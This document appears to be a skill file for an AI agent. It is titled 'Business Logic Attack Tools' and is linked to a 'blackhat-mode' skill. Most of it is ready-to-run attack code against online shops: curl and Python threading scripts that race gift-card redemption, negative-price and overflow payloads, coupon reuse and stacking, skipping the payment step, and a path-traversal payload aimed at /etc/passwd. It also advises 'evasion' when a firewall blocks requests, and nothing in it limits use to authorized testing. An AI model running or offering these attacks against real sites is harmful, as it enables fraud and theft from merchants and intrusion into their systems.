---
name: biz-logic-tools
description: "Business logic — race conditions, workflow abuse, price manipulation, coupon bypass."
version: 1.0.0
author: Yatim
metadata:
  hermes:
    tags: [business-logic, race, workflow, price, coupon, bypass]
    related_skills: [blackhat-mode, exploit-tools]
prerequisites:
  commands: [python]
---

# Business Logic Attack Tools

## When to Load This Skill

User requests:
- "business logic", "race condition", "workflow abuse"
- "price manipulation", "coupon bypass", "discount abuse"

---

## Race Conditions

### Parallel Requests

```bash
# Bash parallel
for i in {1..10}; do
  curl -X POST URL/redeem -d "code=GIFT123" &
done
wait

# Python threading
python -c "
import threading, requests
def req():
    requests.post('URL/redeem', data={'code':'GIFT123'})
[threading.Thread(target=req).start() for _ in range(10)]
"
```

### Time-of-Check to Time-of-Use (TOCTOU)

```python
import requests
import threading

def race_condition(url, data):
    results = []
    
    def send():
        r = requests.post(url, json=data)
        results.append(r.json())
    
    threads = [threading.Thread(target=send) for _ in range(10)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    
    return results
```

---

## Price Manipulation

### Negative Amount

```json
{"item": "product1", "quantity": 1, "price": -100}
{"item": "product1", "quantity": 1, "discount": 200}
```

### Integer Overflow

```json
{"item": "product1", "quantity": 2147483647}
{"item": "product1", "quantity": -1}
```

### Float Precision

```json
{"item": "product1", "price": 0.001}
{"item": "product1", "price": 99999999.99}
```

---

## Coupon Abuse

### Reuse

```bash
# Use coupon multiple times
for i in {1..10}; do
  curl -X POST URL/apply-coupon -d "code=DISCOUNT50"
done
```

### Stacking

```json
{"coupons": ["DISCOUNT50", "FREESHIP", "EXTRA10"]}
```

### Path Traversal

```bash
# In coupon field
curl -X POST URL/apply-coupon -d "code=../../../../etc/passwd"
```

---

## Workflow Abuse

### Step Skipping

```bash
# Skip payment step
curl -X POST URL/complete-order -d "step=complete"

# Skip verification
curl -X POST URL/verify-email -d "skip=true"
```

### State Manipulation

```json
{"status": "completed", "paid": true, "verified": true}
```

---

## Python Business Logic Tools

### Race Condition Tester

```python
import requests
import threading
import json

def test_race(url, data, iterations=10):
    results = []
    lock = threading.Lock()
    
    def send():
        r = requests.post(url, json=data)
        with lock:
            results.append({
                'status': r.status_code,
                'response': r.json()
            })
    
    threads = [threading.Thread(target=send) for _ in range(iterations)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    
    return results

def analyze_results(results):
    successful = [r for r in results if r['status'] == 200]
    return {
        'total': len(results),
        'successful': len(successful),
        'race_vulnerable': len(successful) > 1
    }
```

### Price Manipulator

```python
def test_price_manipulation(url, item_id):
    tests = [
        {'item': item_id, 'price': -100},
        {'item': item_id, 'price': 0},
        {'item': item_id, 'price': 0.001},
        {'item': item_id, 'quantity': -1},
        {'item': item_id, 'quantity': 0},
        {'item': item_id, 'discount': 200},
    ]
    
    results = []
    for test in tests:
        r = requests.post(url, json=test)
        results.append({
            'payload': test,
            'status': r.status_code,
            'response': r.json()
        })
    
    return results
```

### Coupon Abuser

```python
def test_coupon_abuse(url, coupon_code):
    tests = [
        # Multiple uses
        *[{'code': coupon_code} for _ in range(10)],
        # Stacking
        {'codes': [coupon_code, coupon_code]},
        # Path traversal
        {'code': f'../../{coupon_code}'},
    ]
    
    results = []
    for test in tests:
        r = requests.post(f'{url}/apply-coupon', json=test)
        results.append({
            'payload': test,
            'status': r.status_code,
            'response': r.json()
        })
    
    return results
```

---

## Output Format

```json
{
  "vulnerability": "race_condition",
  "endpoint": "POST /api/redeem",
  "results": {
    "total_requests": 10,
    "successful": 5,
    "race_vulnerable": true
  }
}
```

---

## Error Handling

| Error | Cause | Solution |
|-------|-------|----------|
| 429 Rate Limited | Too many requests | Slower pace |
| 400 Bad Request | Wrong format | Check payload |
| 401 Unauthorized | Need auth | Get token |
| 403 Forbidden | WAF blocked | Use evasion |
